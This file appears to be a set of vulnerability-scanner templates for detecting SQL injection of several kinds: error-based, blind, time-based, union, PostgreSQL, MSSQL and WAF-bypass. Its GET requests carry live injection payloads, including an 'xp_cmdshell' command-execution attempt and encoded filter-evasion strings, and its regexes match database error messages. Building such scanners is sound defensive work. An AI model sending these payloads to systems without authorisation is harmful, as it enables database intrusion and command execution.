id: error-based-sqli
info:
  name: Error-Based SQL Injection
  author: AniipID
  severity: critical
  description: Detects SQL injection via error messages from database
  tags: sqli,error-based
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q='"
      - "{{BaseURL}}?q=1'"
      - "{{BaseURL}}?q=1''"
      - "{{BaseURL}}?q=1%22"
    matchers:
      - type: regex
        regex:
          - "SQL syntax.*MySQL"
          - "Warning.*mysql_"
          - "MySqlException"
          - "Unclosed quotation mark"
          - "Microsoft OLE DB.*SQL Server"
          - "ODBC SQL Server Driver"
          - "error in your SQL syntax"
          - "You have an error in your SQL"
          - "Warning.*oci_"
          - "PostgreSQL.*ERROR"
          - "Driver.*SQL Server"
          - "SQLite/JDBCDriver"
          - "SQLite.Exception"
          - "System.Data.SQLite"
          - "org.sqlite."
        condition: or
        name: "error-based-sqli"
---
id: boolean-blind-sqli
info:
  name: Boolean-Based Blind SQL Injection
  author: AniipID
  severity: critical
  description: Detects blind SQLi via boolean condition responses
  tags: sqli,blind,boolean
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=1' AND '1'='1"
      - "{{BaseURL}}?q=1' AND '1'='2"
      - "{{BaseURL}}?q=1' AND 1=1--"
      - "{{BaseURL}}?q=1' AND 1=2--"
    matchers:
      - type: regex
        regex:
          - "You have an error in your SQL"
          - "SQL syntax.*MySQL"
          - "Warning.*mysql_"
          - "MySqlException"
          - "Unclosed quotation mark"
          - "Unclosed quotation"
          - "Microsoft OLE DB.*SQL"
          - "ODBC SQL Server Driver"
          - "You have an error"
          - "PostgreSQL.*ERROR"
          - "ERROR:  syntax error"
          - "ERROR:  unterminated"
          - "PG::Error"
          - "pg_query"
          - "Driver.*SQL Server"
          - "SQLite/JDBCDriver"
          - "SQLite.Exception"
          - "System.Data.SQLite"
          - "org.sqlite."
          - "SQLSTATE\\[[0-9]"
          - "ORA-009[0-9][0-9][0-9]"
          - "ORA-01785"
          - "Microsoft Access.*(syntax|error)"
          - "Unterminated quoted string"
        condition: or
        name: "boolean-blind-sqli"
---
id: time-based-sqli
info:
  name: Time-Based Blind SQL Injection
  author: AniipID
  severity: critical
  description: Detects blind SQLi via time delay payloads
  tags: sqli,blind,time-based
requests:
  - method: GET
    baseline: true
    path:
      - "{{BaseURL}}?q=1' OR SLEEP(5)--"
      - "{{BaseURL}}?q=1' WAITFOR DELAY '0:0:5'--"
      - "{{BaseURL}}?q=1' AND SLEEP(5)--"
      - "{{BaseURL}}?q=1; SELECT SLEEP(5)"
    matchers:
      - type: dsl
        dsl:
          - "duration > 4 && baseline_duration > 0 && duration > baseline_duration * 2"
        name: "time-based-sqli"
---
id: union-based-sqli
info:
  name: Union-Based SQL Injection
  author: AniipID
  severity: critical
  description: Detects SQL injection via UNION SELECT payload
  tags: sqli,union
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=1' UNION SELECT NULL--"
      - "{{BaseURL}}?q=1' UNION SELECT 1,2,3--"
      - "{{BaseURL}}?q=1' UNION ALL SELECT 1,2,3--"
    matchers:
      - type: regex
        regex:
          - "You have an error in your SQL"
          - "SQL syntax.*MySQL"
          - "Warning.*mysql_"
          - "MySqlException"
          - "Unclosed quotation mark"
          - "Unclosed quotation"
          - "Microsoft OLE DB.*SQL"
          - "ODBC SQL Server Driver"
          - "You have an error"
          - "PostgreSQL.*ERROR"
          - "ERROR:  syntax error"
          - "ERROR:  unterminated"
          - "PG::Error"
          - "pg_query"
          - "Driver.*SQL Server"
          - "SQLite/JDBCDriver"
          - "SQLite.Exception"
          - "System.Data.SQLite"
          - "org.sqlite."
          - "SQLSTATE\\[[0-9]"
          - "ORA-009[0-9][0-9][0-9]"
          - "ORA-01785"
          - "Microsoft Access.*(syntax|error)"
          - "Unterminated quoted string"
        condition: or
        name: "union-based-sqli"
---
id: postgres-sqli
info:
  name: PostgreSQL Injection
  author: AniipID
  severity: critical
  description: Detects PostgreSQL-specific SQL injection
  tags: sqli,postgres
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=1' AND 1=1--"
      - "{{BaseURL}}?q=1'; SELECT pg_sleep(5);--"
    matchers:
      - type: regex
        regex:
          - "ERROR:  syntax error"
          - "ERROR:  unterminated quoted string"
          - "ERROR:  invalid input syntax"
          - "PG::Error"
          - "pg_query"
          - "PostgreSQL.*ERROR"
          - "org.postgresql"
        condition: or
        name: "postgres-sqli"
---
id: mssql-sqli
info:
  name: MSSQL Injection
  author: AniipID
  severity: critical
  description: Detects MSSQL-specific SQL injection
  tags: sqli,mssql
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=1' WAITFOR DELAY '0:0:5'--"
      - "{{BaseURL}}?q=1' HAVING 1=1--"
      - "{{BaseURL}}?q=1' EXEC xp_cmdshell('whoami')--"
    matchers:
      - type: regex
        regex:
          - "Incorrect syntax near"
          - "Unclosed quotation mark"
          - "Microsoft OLE DB Provider for SQL"
          - "Microsoft SQL Native Client"
          - "ODBC SQL Server Driver"
          - "Microsoft OLE DB.*SQL Server"
          - "System.Data.SqlClient"
          - "Microsoft.SqlServer"
        condition: or
        name: "mssql-sqli"
---
id: sqli-waf-bypass
info:
  name: SQLi WAF Bypass Techniques
  author: AniipID
  severity: critical
  description: Detects SQL injection using WAF bypass encodings
  tags: sqli,waf-bypass
requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=1'/*!*/AND/*!*/1=1--"
      - "{{BaseURL}}?q=1'/**/AND/**/1=1--"
      - "{{BaseURL}}?q=1'AND%201%3D1--"
      - "{{BaseURL}}?q=1' A%ND 1=1--"
      - "{{BaseURL}}?q=1'%20AND%201=1--"
    matchers:
      - type: regex
        regex:
          - "You have an error in your SQL"
          - "SQL syntax.*MySQL"
          - "Warning.*mysql_"
          - "MySqlException"
          - "Unclosed quotation mark"
          - "Unclosed quotation"
          - "Microsoft OLE DB.*SQL"
          - "ODBC SQL Server Driver"
          - "You have an error"
          - "PostgreSQL.*ERROR"
          - "ERROR:  syntax error"
          - "ERROR:  unterminated"
          - "PG::Error"
          - "pg_query"
          - "Driver.*SQL Server"
          - "SQLite/JDBCDriver"
          - "SQLite.Exception"
          - "System.Data.SQLite"
          - "org.sqlite."
          - "SQLSTATE\\[[0-9]"
          - "ORA-009[0-9][0-9][0-9]"
          - "ORA-01785"
          - "Microsoft Access.*(syntax|error)"
          - "Unterminated quoted string"
        condition: or
        name: "sqli-waf-bypass"
---
